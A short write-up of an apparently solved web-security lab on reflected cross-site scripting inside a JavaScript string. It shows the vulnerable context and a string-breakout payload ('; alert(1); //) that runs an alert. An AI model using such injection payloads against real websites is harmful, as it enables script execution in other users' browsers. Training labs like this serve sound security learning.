
```markdown
# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

| **Category** | Web Security / Client-Side |
| :--- | :--- |
| **Vulnerability Type** | Reflected XSS (JavaScript Context) |
| **Goal** | Break out of a JS string variable to execute code. |
| **Difficulty** | 🟢 Apprentice |
| **Status** | ✅ Solved |

## Conceptual Overview
The input is reflected inside a JavaScript string variable (e.g., `var search = 'INPUT';`). The goal is to terminate the string and the command, then append malicious code.

## Exploitation Steps

### Phase 1: Context Identification
Source code analysis:
```javascript
<script>
    var searchTerms = 'USER_INPUT';
</script>
```
## Phase 2: The Payload (Jailbreak)
I use a single quote ' to close the string, a semicolon ; to finish the command, and // to comment out the rest of the line.

Payload:

```JavaScript
'; alert(1); //
```
## How it renders:

```JavaScript
var searchTerms = ''; alert(1); //';
```
## Execution Result
The browser executes the empty variable assignment and then immediately runs the alert(1) function.